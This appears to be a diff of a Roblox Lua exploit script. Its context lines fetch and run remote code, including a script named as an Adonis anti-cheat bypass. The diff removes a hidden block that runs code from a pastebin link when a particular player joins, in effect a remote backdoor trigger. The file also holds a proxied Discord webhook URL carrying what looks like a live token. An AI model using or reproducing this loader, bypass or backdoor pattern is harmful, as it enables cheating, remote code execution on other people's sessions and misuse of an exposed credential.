@@ -2,14 +2,6 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
-game.Players.PlayerAdded:Connect(function(Player)
-if Player.Name == "ProAIt5000" then
-		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
-		else
-			print("L")
-		end
-	end
-	
 
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
